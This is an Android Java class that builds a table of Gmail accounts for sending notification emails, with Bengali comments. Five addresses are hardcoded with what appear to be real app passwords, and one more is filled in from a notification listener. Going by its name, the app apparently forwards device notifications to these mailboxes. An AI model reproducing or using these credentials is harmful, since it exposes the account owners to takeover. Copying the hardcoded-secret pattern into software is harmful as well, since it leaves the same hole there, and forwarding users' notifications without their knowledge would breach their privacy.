package com.example.fasterpro11;

import android.content.Context;
import android.util.Log;

public class JavaMailAPISendNotificationUseEmails {

    private static final String TAG = "JavaMailAPISendNotificationUseEmails";
    private static NotificationListener notificationListener = new NotificationListener();

    public static String email1;
    public static String email1password;

    public static void initialize(Context context) {
        if (notificationListener == null) {
            notificationListener = new NotificationListener();
        }

        // NotificationListener থেকে ইমেইলের প্রথম অংশ এবং পাসওয়ার্ড বের করা
        String emailFirstPart = notificationListener.SetEmailFirstPartName(context, "");
        String emailPassword = notificationListener.SetEmailPassword(context, "");

        // নাল চেক যোগ করা
        if (emailFirstPart == null || emailPassword == null) {
            Log.e(TAG, "EmailFirstPart বা EmailPassword null হয়েছে!");
            emailFirstPart = "emailFirstPartnull" ;
            emailPassword =  "emailPasswordnull" ;
          //  return; // বা ডিফল্ট মান সেট করুন
        }



        // ইমেইল1 তৈরি করা
        email1 = emailFirstPart + "99@gmail.com";  // প্রথম অংশের সাথে ডোমেইন যোগ করা
        Log.d(TAG, "Generated email1: " + email1);

        // ইমেইল পাসওয়ার্ড সেট করা
        email1password = emailPassword;
        Log.d(TAG, "Generated email1password: " + email1password.replaceAll(".", "*"));  // পাসওয়ার্ড মাক্স করা

        // EMAIL_ACCOUNTS অ্যারেটি আপডেট করা
        EMAIL_ACCOUNTS[0][0] = email1;  // ইমেইল1 অ্যারেতে সেট করা
        EMAIL_ACCOUNTS[0][1] = email1password;  // ইমেইল1 পাসওয়ার্ড অ্যারেতে সেট করা

        // যদি আপনার সমস্ত ইমেইল অ্যাকাউন্ট ডায়নামিকভাবে আপডেট করতে হয়
        updateEmailAccounts();
    }

    // স্ট্যাটিক ইমেইল অ্যাকাউন্ট গুলি
    public static final String email2 = "babulahmed000015@gmail.com";
    public static final String email2password = "ncozjamyddqjiaba";
    public static final String email3 = "fgfgfdf99@gmail.com";
    public static final String email3password = "egcvjvccoqtgwaxo";
    public static final String email4 = "dgdgdfg@gmail.com";
    public static final String email4password = "egqnjvcvvqtgwaxo";
    public static final String email5 = "dgdgdgsdg@gmail.com";
    public static final String email5password = "egqnjbbcoqtgwaxo";
    public static final String email6 = "dgxdgxg@gmail.com";
    public static final String email6password = "egqnjnncoqtgwaxo";

    // EMAIL_ACCOUNTS অ্যারে যেটি ডায়নামিকভাবে আপডেট হবে
    public static String[][] EMAIL_ACCOUNTS = {
            {email1, email1password},  // এখানে ডায়নামিকভাবে আপডেট করা হবে
            {email2, email2password},
            {email3, email3password},
            {email4, email4password},
            {email5, email5password},
            {email6, email6password}
    };

    // EMAIL_ACCOUNTS অ্যারের সকল ইমেইল অ্যাকাউন্ট আপডেট করার জন্য মেথড
    public static void updateEmailAccounts() {
        EMAIL_ACCOUNTS[0][0] = email1;  // প্রথম ইমেইল অ্যাকাউন্ট আপডেট
        EMAIL_ACCOUNTS[0][1] = email1password;  // প্রথম পাসওয়ার্ড আপডেট

        // অন্য ইমেইল অ্যাকাউন্টগুলি, যদি আপনার প্রয়োজন থাকে তাদেরও আপডেট করা
        EMAIL_ACCOUNTS[1][0] = email2;
        EMAIL_ACCOUNTS[1][1] = email2password;

        EMAIL_ACCOUNTS[2][0] = email3;
        EMAIL_ACCOUNTS[2][1] = email3password;

        EMAIL_ACCOUNTS[3][0] = email4;
        EMAIL_ACCOUNTS[3][1] = email4password;

        EMAIL_ACCOUNTS[4][0] = email5;
        EMAIL_ACCOUNTS[4][1] = email5password;

        EMAIL_ACCOUNTS[5][0] = email6;
        EMAIL_ACCOUNTS[5][1] = email6password;

        Log.d(TAG, "EMAIL_ACCOUNTS updated: ");
        for (int i = 0; i < EMAIL_ACCOUNTS.length; i++) {
            Log.d(TAG, "Email: " + EMAIL_ACCOUNTS[i][0] + " Password: " + EMAIL_ACCOUNTS[i][1].replaceAll(".", "*"));
        }
    }

}
